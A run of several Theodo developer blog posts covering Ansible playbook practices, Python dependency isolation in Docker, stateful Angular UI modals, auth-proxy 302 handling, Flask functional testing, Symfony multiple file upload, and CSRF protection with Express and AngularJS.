				Nicolas Girault
  			
  				Nicolas is a web developer eager to create value for trustworthy businesses.
Surrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  			
  		
    
		    
  		
  			
  				  			
  		

  		
				Rodolphe Darves Bornoz
  			
  				Rodolphe is a former entrepreneur and a business developer. After making all the mistakes in the book launching his first startup he joined Theodo to learn the fast way and get ready to start a new venture.  			
  		
    
			

									"
"
										I have been building playbooks for two years and I always try to make them understandable. However, one of our playbooks in a big project became very complex and is now very hard to understand and to maintain. I didn’t want to make that mistake again so I made a list with my personal good practices to prevent building complex playbook that I share with you here.
TL;DR: If you don’t want to build unintelligible playbooks that will cost you a lot in the long run, you should read my following suggestions.
[Edit]: I’m writting a book about Ansible, click here if want a free draft.
Make it simple
I am a web developer not an OPS. I build Node.js/AngularJs and Symfony applications. I remember my first times doing some provisioning, it was running with Puppet. It was brilliant but also very complex. I had a really hard time understanding how it worked and debugging it wasn’t the funniest part in my life. I hated working with provisioning at that time. I still make those nightmares about it…
I was then introduced to Ansible and I completely changed my mind about provisioning \o/. Now I love it. And I want beginners to feel the same as I do. Therefore I really focus on making my playbooks truly simple so they can be understandable by everyone. So if you also believe that automated provisioning should be applied by everyone, then think about beginners when you write your code and make everything simple. Everybody should be able to use your playbooks.

(Thanks Justin Nemmers for the picture !)
Most of the time my playbooks are used to provision servers running a webapp and since I always run them on fewer than 5 servers at a time, I don’t try to make them quick (to execute), speed is not a big deal for me. But I guess execution time is an important factor when you have to run your playbook on thousands of servers.
Therefore, I think that my best practices fit only for people who use Ansible in the same way as I do.
Avoid using tags

I often read that we should tag everything, but I disagree.
TL;DR: It can be OK to tag a role in a playbook, but no one should use tag inside a role.
Why do tags exist in Ansible ? Let’s see what the Ansible documentation says:
If you have a large playbook it may become useful to be able to run a specific part of the configuration without running the whole playbook.
Both plays and tasks support a “tags:” attribute for this reason.
There are ways to avoid tags
I use Ansible to provision my servers or to udpdate a configuration on some servers. Playbooks have to be idempotent and it’s better to check idempotency at each execution. So the only reason why I could be using tags is to gain execution time.
But as I said earlier, time is not a big deal for me. Therefore I have no interest in using them.
If you are building your playbook and you want to run only some roles to gain time, just comment the unnecessary roles in the playbook. You don’t need tags for that.
Sometimes, you may have to perform a specific action. Like during the “heartbleed crisis”, you had to update your bash on almost every server. But even in this kind of situation, you don’t use tags, you use a specific new playbook.
When you run a playbook using tags you are often targeting specifics roles like the example from the Ansible documentation
- name: be sure ntp is installed
  yum: pkg=ntp state=installed
  tags: ntp

- name: be sure ntp is configured
  template: src=ntp.conf.j2 dest=/etc/ntp.conf
  notify:
    - restart ntpd
  tags: ntp

- name: be sure ntpd is running and enabled
  service: name=ntpd state=running enabled=yes
  tags: ntp

In this case I’d rather have a playbook “ntp” that run only the ntp role than using the tags.
Which one of the following commands tells us the most clearly what is going to happen ?
ansible-playbook playbook.yml -i hosts/production --tags=""ntp""

or
ansible-playbook ensure-ntp-is-working.yml -i hosts/production

The first one is talking about ntp. But we don’t know the purpose of running this command. With the second one we know that it is to ensure that ntp is working.
Think about beginners ! Make their life easier, don’t use tags.

Tags come from the dark side
So tags are not useful. But there is worse. They are harmful to your playbook because they add complexity. When you add a tag, this tag is here for a purpose. Therefore, every time they see a tag in your playbook, people have to understand the purpose of it. As a result, your playbook is becoming more difficult to understand and to maintain.
Here is a part of one of our nginx’s role.
- name: add repo file
  template: src=nginx.repo dest=/etc/yum.repos.d/nginx.repo mode=644 owner={{ app_user }}
  tags:
  - nginx
  - packages

- name: install
  yum: name=nginx enablerepo=nginx state=latest
  tags:
  - nginx
  - packages
  - yum

- name: create working directories
  file: path={{ item }} state=directory mode=755 owner={{ app_user }}
  with_items:
    - ""{{ etc_path }}/nginx""
    - ""{{ etc_path }}/nginx/conf.d""
    - ""{{ log_path }}/nginx""
    - ""{{ tmp_path }}/nginx""
  tags:
  - nginx
  - filesystem

- name: remove nginx conf file
  file: path=/etc/nginx/nginx.conf state=absent
  tags:
  - nginx
  - yum-cleaning

- name: disable service as sudo_user
  service: name=nginx enabled=no
  tags:
  - nginx
  - services
  - yum-cleaning

There are six different tags (nginx, packages, yum, filesystem, yum-cleaning, service) making at least 6 ways of using the role. If you want to test your playbooks (and you should), you will have to test every combination that your tags permit instead of one single run without tags. It’s already hard to test the playbooks because they depend on the Ansible version and the OS version. If you add tags, it becomes really annoying.
In this role, if we want to test every possible combination, we will have to test 2^6 = 64 combinations !

The same part of the role without the tags is pretty simple. We know that every task will be run anytime without any condition or specific purpose to understand.
- name: add repo file
  template: src=nginx.repo dest=/etc/yum.repos.d/nginx.repo mode=644 owner={{ app_user }}

- name: install
  yum: name=nginx enablerepo=nginx

- name: create working directories
  file: path={{ item }} state=directory mode=755 owner={{ app_user }}
  with_items:
  - ""{{ etc_path }}/nginx""
  - ""{{ etc_path }}/nginx/conf.d""
  - ""{{ log_path }}/nginx""
  - ""{{ tmp_path }}/nginx""

- name: remove nginx conf file
  file: path=/etc/nginx/nginx.conf state=absent

- name: disable service as sudo_user
  service: name=nginx enabled=no

It’s nearly impossible to remember all the tasks of your playbook that have a particular tag. So it’s never crystal clear what your are doing when you run your playbooks using tags.

One role, one goal
Avoid tasks within a role that are not related to each others. Don’t build “common role“. It’s ugly and it’s bad for the readability of your playbook.

Instead try to make more little roles with explicit names.
See this playbook:
- name: My playbook
  hosts: all
  sudo: true
  vars_files:
    - vars/main.yml

  roles:
    - common #What the hell does this role do?
    - Stouts.nodejs
    - Stouts.mongodb

And this one:
- name: My playbook
  hosts: all
  sudo: true
  vars_files:
    - vars/main.yml

  roles:
    - ubuntu-apt
    - create-www-data-user
    - Stouts.nodejs
    - Stouts.mongodb

The last one is easier to understand.
Convention on naming your role.
I really like roles that can be run on many OSs and for many kinds of application. I try to make my roles as generic as I can. But, if in order to work on many OSs or for many applications, the role becomes too complex, then I prefer using a more specific but simpler role.

If your role works only on some OSs or for a specific kind of application, you should explicitly say so in the role’s name. By making so, just by reading the role’s name we know how specific it is.
We often find the name of the author in the name of a role but having it doesn’t help us a lot to understand how a role works. So I think it shouldn’t be in the role’s name.
Taking into account what I just said, my convention on how to name a role is OS-Application-Purpose.
A few examples:
– debian-symfony-nginx: I can quickly understand that this role provision nginx for Symfony’s applications on every OS of the Debian’s family.
– ubuntu-mongodb: The role will install and configure MongoDB on Ubuntu.
– nodejs: Here the role will install Node.js on every kind of OS.
Make explicit the dependencies of a playbook
A playbook should be read like a great story in a book. You read the roles from top to bottom and you understand everything that is going on with the playbook, period.

If you want to quickly understand what a playbook does which solution do you prefer?
- name: My playbook with dependencies
  hosts: all
  sudo: true
  vars_files:
    - vars/main.yml

  roles:
    - elasticsearch
    - drupal

or
- name: My playbook without dependencies
  hosts: all
  sudo: true
  vars_files:
    - vars/main.yml

  roles:
    - java
    - elasticsearch
    - git
    - apache
    - mysql
    - php
    - php-mysql
    - composer
    - drush

When you read the second one, you see every roles involved in the playbook and you don’t have to dig to get the information.
One server, one run to provision it the first time
You can have many playbooks to manage your server in your daily operations like the ensure-ntp-is-working.yml playbook.
But you should be able to provision it the first time with only one playbook.
You shouldn’t do something like this:
ansible-playbook -i hosts/myserver playbook_part1.yml
ansible-playbook -i hosts/myserver playbook_part2.yml
ansible-playbook -i hosts/myserver playbook_part3.yml

Instead, you should be able to provision your server with:
ansible-playbook -i hosts/myserver playbook.yml


If you have more than one playbook, in most of the time you will have to remember the order in which you have to run them. Testing and checking idempotency are also more pratical having one playbook instead of many.
Explore Ansible Galaxy
There are many great roles over there. Instead of rewriting everything go forking! Look at how other people do, you will learn faster.
Don’t use requirements.txt
When you type ansible-galaxy install -r requirements.txt, it uses the tag of the Github repository to git clone it. A git tag doesn’t set a version of the code. The code behind a tag can be updated. So you can’t know for sure what you will end up downloading by this way. And this is bad for many reasons including security.

Instead use GIT and add the roles as submodules. It allows you to update the roles while being confident about the version of the code you download.
Put the community’s roles in a separate folder
If you want to be able to update the roles you found on ansible-galaxy or directly on Github you should put it in a separate folder so you can quickly find your roles (that you can change) and the community role (that you shouldn’t change). You will end with something like:

├── group_vars
├── hosts
├── roles
│   ├── community
│   │   ├── composer
│   │   ├── ubuntu-apt
│   │   ├── ubuntu-mysql
│   │   └─ ubuntu-symfony-nginx
│   ├── my_app-monitoring
│   └─ ubuntu-rabbitmq
├── vars
└─ playbook.yml

If you really want to make a change to a community role, you have two options:
– You make a pull-request for this change.
– You make the change and you move the role in the directory with your own roles.
If you choose to separate your roles, you have to tell Ansible where it can find them with the ansible.cfg file like for example:

[defaults]
roles_path = devops/provisioning/roles/community
inventory = devops/provisioning/hosts

Don’t use ‘vagrant provision’
If you are a Vagrant user, you may be using the ansible provisioner. I know that the command is very convenient but it will confuse beginners a lot because there are differents concepts involved:
– Creating the VM (Virtualbox)
– Configuring the VM (Vagrant)
– Provisioning the VM (Ansible)
It’s already not easy to understand each role of Virtualbox and Vagrant during the creation of the VM. If you mix it with the role of Ansible, you are not helping…

And honestly, you won’t lose so much time using
ansible-playbook playbook.yml -i hosts/vagrant

instead of
vagrant provision

At Theodo, we use OpenStack to create VMs for our staging environment. There is also plugin to create OpenStack’s VM from the Vagrantfile. Same story here, don’t use this plugin because it’s highly confusing.
One day one brillant trainee spent almost the whole day trying to create and provision one OpenStack VM via the Vagrantfile. Because we were doing vagrant up and vagrant provision for the dev environment, he wanted to do the same for the staging one to have consistency.

Keep it light
This is the same as any other part of your code: you should delete every file and directory that is not mandatory.

Check out our open source projects
We have a small open source organization on Github, have a look at out our website. Our goal is to provide simple-to-use tools to make the provisioning with Ansible easier and easier. By doing this, we hope that we will help a lot of people learning and enjoying Ansible. If you like the spirit of this organization, we are looking for people to help us.Just make a nice PR and you will be welcome! =).

Other great tips
I really liked this article about “Ansible (Real Life) Good Practices“.
You will find other opinions about tags… ;).
It will explain why you should:
– Use a module when available
– Set a default for every variable
– Use the ‘state’ parameter
– Prefer scalar variables
– Tag every task and role
You can find some other tips here like “Beware of default” in these slides.
Thanks for reading, if you want to share your bests tips with us, they are very welcome! The fastest way is to ping me on Twitter.
If you need help to build a nice Agile/Devops working environment, we will love helping you!

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Maxime Thoonsen
  			
  				Education Hacker. Full Stack developer - Agile and Lean Coach
Twitter: https://twitter.com/maxthoon
Github: https://github.com/MaximeThoonsen  			
  		
    
			

									"
"
										If you’ve ever developed a python application, you’ve probably installed your python dependencies in a virtualenv. A simple way to do so is:
# build a virtualenv
virtualenv venv

# activate the virtualenv
source venv/bin/activate

# install some dependencies
pip install flask

Thanks to virtualenv your project dependencies are now isolated from your other projects and from the operating system packages. Simple, isn’t it?
Another way to locally isolate you project is to install your dependencies in a docker container (actually the best practice would be to use virtualenv in a docker container as described here: https://hynek.me/articles/virtualenv-lives).
In this use-case, you’ll want to store the python packages required by your application in a mounted folder to avoid re-installing them everytime you reset your container in development. In other words, you’ll want to store the python dependencies in a specific folder.
The first obvious solution to that is using the -t, --target <dir> Install packages into <dir>. pip option.
However this option ends up being a trap. When using the --target option the installer changes its behaviour in a non desirable way for us, and becomes incompatible with the --upgrade option as described here: https://github.com/pypa/pip/issues/1489.
A better solution, in line with PEP 370, is to use the PYTHONUSERBASE environment variable. Cf. https://www.python.org/dev/peps/pep-0370/.
You just need to then use pip install --user and your packages will be installed in a specific folder without any of the strange side-effects of the --target option.
Here is the detailed step-by-step solution.
Your docker-compose file should look like this:
# docker-compose.yml
vendors:
  image: python:3
  working_dir: /mnt
  volumes:
    - .:/mnt
  environment:
    PYTHONUSERBASE: /mnt/vendor
  command: pip install -r requirements.txt --user --upgrade

server:
  image: python:3
  working_dir: /mnt
  volumes:
    - .:/mnt
  ports:
    - '5000:5000'
  environment:
    PYTHONPATH: src
    PYTHONUSERBASE: /mnt/vendor
  command: python src/server.py


Install your vendors (do it twice just to check!):
docker-compose run --rm vendors
Run your app:
docker-compose up -d server
Conclusion
The PYTHONUSERBASE is used to compute the path of the user site-packages directory. You should use it in pair with the pip --user option to install python packages in a custom directory.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Girault
  			
  				Nicolas is a web developer eager to create value for trustworthy businesses.
Surrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  			
  		
    
			

									"
"
										Stateful modals with Angular UI router
Modals are very useful to capture user focus, thus enhancing user experience.
Their use was largely popularized by Twitter Bootstrap and now by its Angular-equivalent: Angular UI Bootstrap.
This article assumes you are familiar with the Angular UI router and Angular. Code samples are written in Coffeescript and Jade.
Creating a modal with UI Bootstrap
First you need to set up the action trigger. In our case, we’ll use a simple button.
# home/states/main/view.jade (View from which the modal is launched)
//...
button.btn.btn-default(ng-click=""launchModal()"")
//...

launchModal is called by the ng-click directive and triggers the modal. If you need to pass arguments to your modal, you can add a resolve attribute, as shown below.
# home/states/main/controller.coffee  (Controller of the view from which the modal is launched)
angular.module 'home-module'
  .controller 'HomeController', ($scope) ->
    $scope.foo = 'bar'
    $scope.launchModal = ->
      modalInstance = $modal.open
        animation: true
        templateUrl: 'home/modals/mymodal/view.html'
        size: 'lg'
        controller: 'MyModalCtrl'
        resolve:
          myVar: ->
            $scope.foo

      modalInstance.result.then (anotherVar) ->
        $scope.anotherVar = anotherVar

Notice myVar is then available in the Modal controller by adding it as a dependency.
# home/modals/mymodal/controller.coffee (Modal controller)
angular.module 'home-module'
  .controller 'MyModalCtrl', ($scope, $modalInstance, myVar) ->
    $scope.myVar = myVar
    $scope.ok = ->
      // ...
      $modalInstance.close $scope.anotherVar
    $scope.cancel = ->
      $modalInstance.dismiss 'cancel'

The Modal view :
# home/modals/mymodal/view.jade (Modal view)
.modal-header
  h3.modal-title
    span This is the modal title.
    span.pull-right
      i.fa.fa-remove.cursor(ng-click=""cancel()"")
.modal-body
  p
    This is the modal body. `myVar` is available here : {{ myVar }}
.modal-footer
  button.btn.btn-primary(ng-click=""ok()"")
  button.btn.btn-link(ng-click=""cancel()"")

If need be, you may return a variable on modal closure, in our case anotherVar. This variable is passed down to the modal promise.
# home/states/main/controller.coffee  (Controller of the view from which the modal is launched)
angular.module 'home-module'
  .controller 'HomeController', ($scope) ->
    $scope.foo = 'bar'
    $scope.launchModal = ->
      modalInstance = $modal.open
        animation: true
        ...

      modalInstance.result.then (anotherVar) ->
          console.log 'Promise has resolved'
          $scope.anotherVar = anotherVar
        , ->
          console.log 'Promise was rejected'

Making it stateful
A great way to improve the ergonomy of your application is to make some modals stateful: if your modal represents a key step in your application – login, subscribe, view my cart, etc-, as opposed to an alert or confirmation modal, then it should have its own url.
This is made possible by Angular UI Router, by linking your modal to a state with onEnter:
# home/module.coffee
angular.module 'home', [...]
.config ($stateProvider) ->

  $stateProvider
    .state 'home',
      url '/home'
      ...

    .state 'home.properties',
      url: '/properties/:foo'
      onEnter: ($modal, $state, $stateParams) ->
        modalInstance = $modal.open
          animation: false
          templateUrl: 'home/modals/mymodal/view.html'
          controller: 'MyModalCtrl'
          size: 'lg'
          resolve:
            myVar: ->
              $stateParams.foo

        modalInstance.result.finally ->
          $state.go '^'

The state home.properties is a child state of home. It will load its template in its parent’s ui-view, as demonstrated below. Moreover the modal is triggered by a ui-sref attribute, as you would do with a link. Finally, $state.go '^' redirects you to the parent state when the modal promise is resolved.
# home/states/main/view.jade (View from which the modal is launched)
//...
button.btn.btn-default(ui-sref=""home.properties({foo: 'bar'})"")
//...
.ui-view

Conclusion
That’s all folks! If you want to see a live example of stateful modals, you can check out Trello.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marc Perrin-Pelletier
  			
  				  			
  		
    
			

									"
"
										If you’ve ever developed web applications for a large company, you must be familiar with having authentication done by a third-party proxy. And by third-party I mean handled by another team.
This is what our full stack javascript app architecture looks like:

The proxy is the door to your application, so it’s paramount that it behaves the way you expect it to. For instance when your session expires, you might expect a 401 from this proxy and build your app’s response around that. If you get a 302 instead, your app won’t work properly.
When the proxy’s behavior is controlled by another team, having to require their help takes time and introduces delays, so generally you try to make do with what you have! Following is a quick overview of how our team dealt with such a situation.
Diagnosis
In our case, we were having problems with API calls from our application:
XMLHttpRequest cannot load https://auth-server.com?sourceUrl=https%3A%2F%2Fmy-app.com%2Fapi%2Fexample. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin https://my-app.com/api/example is therefore not allowed.

is the chrome console error we kept having. After looking it up, this is what you get when trying to make a cross-domain ajax call.
By default, you are not allowed to request a resource from another domain via an ajax call. This prevents security issues such as cross-site scripting (XSS) attacks.
This is why none of our API calls actually went through.

Since our application is cached (via a cache manifest), when trying to use it while our authentication session has expired, we only fire ajax API calls to https://my-app.com/api/example. Unfortunately those calls are blocked and in the end, the user is never redirected to the login page.
How to allow cross-domain calls
Calling an asset via an ajax call is possible only if the domain which hosts that asset allows it. You can enable it by adding this header:
Access-Control-Allow-Origin: https://my-app.com
For the record, this header comes along with 3 others, which help you narrow down the rule to your specific need:
Access-Control-Allow-Methods: POST, GET, HEAD, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER
Access-Control-Max-Age: 1728000

Intercepting a 302 with Angular
Suppose we convince the authentication team to add the right header, we should then be able to intercept their 302 response whenever we fire a API call while unauthenticated. Right? This is how you intercept a specific http code with angular:
angular.module('http-auth-interceptor', ['http-auth-interceptor-buffer'])
.factory('httpMovedInterceptor', function($window, $location){
  return {
    response: function(rejection) {
      var loginPage = 'https://auth-server.com/login'
      if (rejection.status == 302 && rejection.config.url.split('?')[0] == loginPage) {
        return $window.location.href = loginPage + '?sourceUrl=' + encodeURIComponent($location.absUrl())
      }
    }
  };
})
.config(['$httpProvider', function($httpProvider) {
  $httpProvider.interceptors.push('httpMovedInterceptor');
}])
...

First we create a factory to intercept 302 responses, then we register it with the $httpProvider.
Unfortunately this wouldn’t work! The 302 http code is dealt with at a browser level – as shown on below figure, meaning that your app cannot intercept the 302 in time and instead gets the 200 from the login page.

Solution
Ideal
Let’s stay pragmatic here! Probably the easiest and most efficient solution is to ask the authentication team to change the proxy’s response from 302 to 401. This way, you can easily detect when your API calls fail and ‘manually’ redirect your browser to your authentication login page.
However, the authentication team may not be able to comply with that need. For instance, if they have other teams excepting a 302 and cannot work on a case-by-case basis.
Workaround
If you have to stick with the 302s, what you’re left with is analyzing the API call responses and whenever you get a 200 code and page url that corresponds to your page login, you manually force your browser to load that page with:
$window.location.href = <you login page url>
Conclusion
Proxies which send you 302s on authentication can be a nightmare to deal with when developing API based applications. Do ask for 401s instead in response to any unauthenticated API calls. If that’s not achievable, you’ll have to expect your login page as a response to your ajax call and manually redirect to the login page in your browser.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Marc Perrin-Pelletier
  			
  				  			
  		
    
			

									"
"
										You can find the source code written in this article in the flask-boilerplate that we use at Theodo.
Functionally Testing an API consists in calling its routes and checking that the response status and the content of the response are what you expect.
It is quite simple to set up functional tests for your app. Writing a bunch of HTTP requests in the language of you choice that call your app (that has previously been launched) will do the job.
However, with this approach, your app is a blackbox that can only be accessed from its doors (i.e. its URLs). Although the goal of functional tests is actually to handle the app as a blackbox, it is still convenient while testing an API to have access to its database and to be able to mock calls to other services (especially in a context of micro-services environment).
Moreover it is important that the tests remain independent from each other. In other words, if a resource is added into the database during a test, the next test should not have to deal with it. This is not easy to handle unless the whole app is relaunched before each test. Even if it is done, some tests require different fixtures. It would be tricky to handle.
With this first approach, our functional tests were getting more complex than the code they were testing. I would like to share how we improved our tests using the flask test client class.
You don’t need to know about flask/python to understand the following snippets.
The API allows to post and get users. First we can write a route to get a user given its id:
# src/route/user.py
from model import User

# When requesting the URL /user/5, the get_user_by_id will be executed with id=5
@app.route('/user/<int:id>', methods=['GET'])
def get_user_by_id(self, id):
    user = User.query.get(id)
    return user.json  # user.json is a dictionary with user data such as its email

This route can be tested with the flask test client class:
# test/route/test_user.py
import unittest
import json

from server import app
from model import db, User

class TestUser(unittest.TestCase):

    # this method is run before each test
    def setUp(self):
        self.client = app.test_client()  # we instantiate a flask test client

        db.create_all()  # create the database objects
        # add some fixtures to the database
        self.user = User(
            email='joe@theodo.fr',
            password='super-secret-password'
        )
        db.session.add(self.user)
        db.session.commit()

    # this method is run after each test
    def tearDown(self):
        db.session.remove()
        db.drop_all()

    def test_get_user(self):
        # the test client can request a route
        response = self.client.get(
            '/user/%d' % self.user.id,
        )

        self.assertEqual(response.status_code, 200)
        user = json.loads(response.data.decode('utf-8'))
        self.assertEqual(user['email'], 'joe@theodo.fr')

if __name__ == '__main__':
    unittest.main()

In these tests:

all tests are independent: the database objects are rebuilt and fixtures are inserted before each test.
we have access to the database via the db object during the tests. So if you test a ‘POST’ route, you can check that a resource has been successfuly added into the database.

Another benefit is that you can easily mock a call to another API. Let’s improve our API: the get_user_by_id function will call an external API to check if the user is a superhero:
# src/client/superhero.py
import requests

def is_superhero(email):
    """"""Call the superhero API to find out if this email belongs to a superhero.""""""
    response = requests.get('http://127.0.0.1:5001/superhero/%s' % email)
    return response.status_code == 200

from client import superhero
# ...
@app.route('/user/<int:id>', methods=['GET'])
def get_user_by_id(self, id):
    user = User.query.get(id)
    user_json = user.json
    user_json['is_superhero'] = superhero.is_superhero(user.email)
    return user_json

To prevent the tests from depending on this external API, we can mock the client in our tests:
# test/route/test_user.py
from mock import patch
#...

@patch('client.superhero.is_superhero')  # we mock the function is_superhero
def test_get_user(self, is_superhero_mock):
    # when is_superhero is called, it returns true instead of calling the API
    is_superhero_mock.return_value = True

    response = self.client.get(
        '/user/%d' % self.user.id,
    )
    self.assertEqual(response.status_code, 200)
    user = json.loads(response.data.decode('utf-8'))
    self.assertEqual(user['email'], 'joe@theodo.fr')
    self.assertEqual(user['is_superhero'], True)

To use this mock for all tests, the mock can be instantiated in the setUp method:
# test/route/test_user.py
def setUp(self):
    #...
    self.patcher = patch('client.superhero.is_superhero')
    is_superhero_mock.return_value = True
    is_superhero_mock.start()
    #...

def tearDown(self):
    #...
    is_superhero_mock.stop()
    #...

Conclusion
With the Flask test client, you can write functional tests, keep control over the database and mock external calls. Here is a flask boilerplate to help you get started with a flask API.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Girault
  			
  				Nicolas is a web developer eager to create value for trustworthy businesses.
Surrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  			
  		
    
			

									"
"
										
Note : this article has been written for Symfony 2. It is not working with Symfony 3.
The long and exhausting journey
Have you already told your product owner that the feature he was suggesting was too ambitious right now and that he should prioritize?
It is often the case when multiple files upload is on the table. Indeed, the symfony cookbook contains a very simple, yet detailed article describing how to setup a single file upload.
Multiple files upload is seen by most developers as a quite more complex task. The first thing that comes to mind is usually to:

Create a new class representing the file (containing at least its path)
Add a OneToMany relationship between the Document class and the File class
Add a form collection and write the necessary javascript to manage this collection (i.e. at least add/remove a file)
Adapt the Document methods to handle the form collection

The point of this article is to introduce a much faster way to set up multiple files upload through the usage of the fairly new multiple field option (implemented in Symfony 2.6).
The pragmatic and time-saving way
Let’s start with the fileupload symfony cookbook.
To handle multiple files, the first thing to do is to adapt our form:
public function buildForm(FormBuilderInterface $builder, array $options)
{
    $builder
        ->add('name')
        ->add('files', 'file', array(
            'multiple' => true, 
            'data_class' => null,
        ));
}

Try it and note that Symfony displays the HTML5 input multiple Attribute
When you submit the form, an array of UploadedFile is sent instead of a single object. Thus, we need to adapt our Document class to persist an array of paths instead of a single one:
/**
 * @ORM\Column(type=""array"")
 */
private $paths;

and it is necessary to adapt the upload() method to persist each file:
/**
 * @ORM\PreFlush()
 */
public function upload()
{
    foreach($this->files as $file)
    {
        $path = sha1(uniqid(mt_rand(), true)).'.'.$file->guessExtension();
        array_push ($this->paths, $path);
        $file->move($this->getUploadRootDir(), $path);

        unset($file);
    }
}

And that’s all!
Hurray, we can now persist multiple files and it took us 5 minutes! Isn’t it satisfying?
Now let’s go further. What we have done is great, but lacks flexibility. Let’s give a file its own entity. We will then be able to store some metadata such as its name or size.
The effortless elegant method
Okay, we now want our own File class. Let’s create something simple. It will be easy to adapt it later if needed:
/**
 * @ORM\Table(name=""files"")
 * @ORM\Entity
 */
class File
{
    /**
     * @var integer
     *
     * @ORM\Column(name=""id"", type=""integer"")
     * @ORM\Id
     * @ORM\GeneratedValue(strategy=""AUTO"")
     */
    private $id;

    /**
     * @var string
     *
     * @ORM\Column(name=""path"", type=""string"", length=255)
     */
    private $path;

    /**
     * @var string
     *
     * @ORM\Column(name=""name"", type=""string"", length=255)
     */
    private $name;

    /**
     * @var integer
     *
     * @ORM\Column(name=""size"", type=""integer"")
     */
    private $size;

    /**
     * @var UploadedFile
     */
    private $file;

    /**
     * @ORM\ManyToOne(targetEntity=""Document"", inversedBy=""files"")
     * @ORM\JoinColumn(name=""document_id"", referencedColumnName=""id"")
     **/
    private $document;

Then, we need to adapt our Document class:
/**
 * @var File
 *
 * @ORM\OneToMany(targetEntity=""File"", mappedBy=""document"", cascade={""persist""})
 *
 */
private $files;

/**
 * @var ArrayCollection
 */
private $uploadedFiles;

The attribute $uploadedFiles is necessary because this is the one which will be hydrated when the form is submitted.
Now let’s adapt the upload method and instantiate our new class dynamically:
/**
 * @ORM\PreFlush()
 */
public function upload()
{
    foreach($this->uploadedFiles as $uploadedFile)
    {
        $file = new File();

        /*
         * These lines could be moved to the File Class constructor to factorize 
         * the File initialization and thus allow other classes to own Files
         */
        $path = sha1(uniqid(mt_rand(), true)).'.'.$uploadedFile->guessExtension();
        $file->setPath($path);
        $file->setSize($uploadedFile->getClientSize());
        $file->setName($uploadedFile->getClientOriginalName());

        $uploadedFile->move($this->getUploadRootDir(), $path);

        $this->getFiles()->add($file);
        $file->setDocument($this);

        unset($uploadedFile);
    }
}

And we are done, awesome, we can now upload multiple files and populate in the same time entities to represent them!
Here is an implementation of what is described in this section.
The bundle polish
Okay. One might say that the HTML 5 multiple attribute is not (quite) the state of the art in terms of UI. Fair enough, let’s introduce a magical bundle which will beautify your brand new multiple files upload feature.
Ladies and gentlemen, let me introduce OneupUploaderBundle. This bundle provides the choice between the most used file uploads javascript libraries.
The operation of this bundle is a little bit different from the first two sections of this article. In fact, submitting a file will trigger an ajax call on a specific url. The idea is then to create an event listener which will persist on the fly the incoming files.
For example, your edit page view will contain something like:
<div action=""{{ oneup_uploader_endpoint('document_files') }}"" 
id=""portfolio"" class=""dropzone"">

And your eventListener will contains a method catching the upload events:
/**
 * @param PostPersistEvent $event
 */
public function onUpload(PostPersistEvent $event)
{

Conclusion
Hopefully, this article gave you a clear overview of what is hidden behind multiple files uploads, as well as the keys to develop this feature quickly.
Don’t hesitate to suggest any improvement, I will keep it up to date.

Sources

Stack Overflow Article which gaves me the original idea
Symfony cookbook page about file upload which helped to start this tutorial from a good and well-documented example


Thanks
I would like to thank the Theodoers who took the time to proofread this article:

Tristan
Alexandre
Jean-Luc
Woody
Nicolas



										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Julien Vallini
  			
  				Web Developer @ Theodo  			
  		
    
			

									"
"
										CSRF vulnerabilities are one of the most common and important flaws in Web applications security. It is listed as the eighth most critical vulnerability in the OWASP Top 10. Symfony2, which we often work with at Theodo, offers cool automatic tools (especially for forms) to protect your applications against such flaws. But when it comes to our applications using Angular and Express, there are things that need to be done.
What are CSRF attacks?
CSRF is the acronym for Cross Site Request Forgery. Those attacks consist in making users of an application send a request the attacker has previously forged.
Let’s say that, in a vulnerable application, some users are able to delete accounts. This action requires specific rights in the application, such as being an admin. The attacker may generate a script whose goal is to send the request “delete the user whose id equals 42” to our application’s server. If the request uses a GET HTTP method, a simple hyperlink might suffice! He will then make an admin of our application send this request by making him go on a website that executes the script. The admin user has either a session or cookies stored in his browser specifying he has the admin role. And thus, when he sends the request, he indeed deletes the account of the user of id 42!
The request does not come from our application, but from another website, thus the Cross Site Request Forgery name. The idea is to prove to our server that the request does not come from foreign websites. We will use a randomly generated token by the server, that will have to be included in the request.
How to prevent it with Express and AngularJS?
It is actually pretty simple, there aren’t as many things to do as there used to be. You’ll have to install a middleware, and tell Express how to use it. Finally you’ll have to tell Express which name the cookie must be given for Angular to recognize it.
The middleware I used is called csurf. It used to be native in Express 3.x, but it is not the case anymore since it moved on to 4.x (almost one year ago). Nevertheless, it is still pretty easy to install. Add the line
""dependencies"": {
    ...
    ""csurf"": ""^1.7.0""
},

to your dependencies in your package.json file and then make npm install. You might also directly make ‘npm install –save csurf@1.7.0’
Then, in your main express file, you have to add a few lines to configure the csurf middleware.
csrf = require('csurf');

...

app.use(cookieParser('secretPassword'));
app.use(csrf());
app.use(function(req, res, next) {
  res.cookie('XSRF-TOKEN', req.csrfToken());
  return next();
});

What are these lines for? You tell Express to use csurf that you just required. This must be done after cookie and/or session initialization in order for the middleware to be correctly configured.
Then, you will tell Express that it must write the csrf cookie in the response in the ‘XSRF-TOKEN’ field. This is it. Your app is protected against CSRF attacks. Now, whenever your AngularJs application will send a POST request, it will add a header inside, whose name will be X-XSRF-COOKIE. And the csurf middleware will automatically look for this header and compare it with the value it expects. Csurf expects the token in a header named csrf-token, xcsrf-token, x-csrf-token, or x-csrf-token. Thus, no need to change anything, it’s automatic!
